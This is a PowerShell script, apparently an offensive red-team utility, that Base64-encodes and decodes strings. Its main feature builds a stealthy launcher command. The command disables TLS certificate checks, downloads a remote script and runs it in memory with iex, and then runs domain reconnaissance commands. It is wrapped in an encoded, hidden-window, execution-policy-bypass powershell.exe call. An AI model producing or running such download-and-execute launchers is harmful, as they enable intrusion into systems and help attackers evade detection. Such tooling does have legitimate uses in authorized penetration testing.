# Coded by Jesse Nebling (@bashexplode)
# Base64.ps1 version 1.0
# Takes a string and Base64 encodes/decodes it
# Added functionality to output a basic powershell command to execute code in memory

[CmdletBinding()]
Param(
        [string]
        $Decode,

        [string]
        $Encode,

        [Switch]
        $SimpleExec,

		[string]
        $URL,

		[string]
        $Command

# Will add this later
#        [Switch]
#        $AdvancedExec,
)

function encode($string) {
    $ExecBytes = [System.Text.Encoding]::Unicode.GetBytes($string)
    $ExecEncoded = [Convert]::ToBase64String($ExecBytes)
	return $ExecEncoded
}

function decode($string) {
	$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))
	return $DecodedText
}

function build($url, $command) {
    $DString = "(new-object net.webclient).downloadstring('$url')"
    $Execution = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; iex $DString; $Command"
	$ExecEncoded = encode($Execution)
	$ExecPSString = "powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -enc $ExecEncoded"
	return $ExecPSString
}


if ($Encode) {
	$string = encode($Encode)
	Write-Host $string
	}

if ($Decode) {
	$string = decode($Decode)
	Write-Host $string
	}

if($SimpleExec){
    if ($URL -AND $Command){
        $Exec = build($URL, $Command)
		Write-Host $Exec
    }
    elseif(!$URL -AND !$Command){
	Write-Warning "[!] Please enter a URL with the -URL flag (i.e. https://192.168.0.1/script.ps1) and the command you plan on running with the -Command flag (i.e. Get-NetUser -Domain NAM)"
    "[!] Please enter a URL with the -URL flag (i.e. https://192.168.0.1/script.ps1) and the command you plan on running with the -Command flag (i.e. Get-NetUser -Domain NAM)"
	}
	elseif (!$URL){
    Write-Warning "[!] Please Enter a URL with the -URL flag (i.e. https://192.168.0.1/script.ps1)"
    "[!] Please Enter a URL with the -URL flag (i.e. https://192.168.0.1/script.ps1)"
    return
    }
	else{
	Write-Warning "[!] Please enter the command you plan on running with the -Command flag (i.e. `"Get-DomainGroupMember`")"
	"[!] Please enter the command you plan on running with the -Command flag (i.e. `"Get-DomainGroupMember`")"
	}
}
